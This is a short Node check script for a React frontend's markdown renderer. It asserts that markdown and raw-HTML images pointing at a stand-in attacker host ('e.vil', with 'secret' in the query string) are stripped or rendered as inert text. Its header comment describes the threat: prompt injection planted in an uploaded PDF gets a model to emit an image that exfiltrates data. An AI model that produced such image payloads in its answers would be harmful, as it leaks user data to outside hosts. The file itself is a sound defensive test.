// Run: node src/utils/markdown.check.mjs   (no test framework in this frontend)
// Answers are model output and may echo an uploaded PDF's planted instructions: an image
// would make the browser request an attacker's URL (data in the query string).
import assert from 'node:assert/strict';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import ReactMarkdown from 'react-markdown';
import { MD_PROPS } from './markdown.js';

const html = renderToStaticMarkup(createElement(ReactMarkdown, MD_PROPS,
  'Revenue **up**.\n\n![x](https://e.vil/?q=secret)\n\n<img src="https://e.vil/raw">\n\n| A | B |\n|---|---|\n| 1 | 2 |'));
assert.ok(!html.includes('<img'), html);
assert.ok(!html.includes('q=secret'), html);              // the markdown image's URL is gone
assert.ok(html.includes('&lt;img'), html);                // raw HTML shows as inert text
assert.ok(html.includes('<strong>up</strong>') && html.includes('<table>'), html);  // GFM still on

console.log('markdown.check: ok');
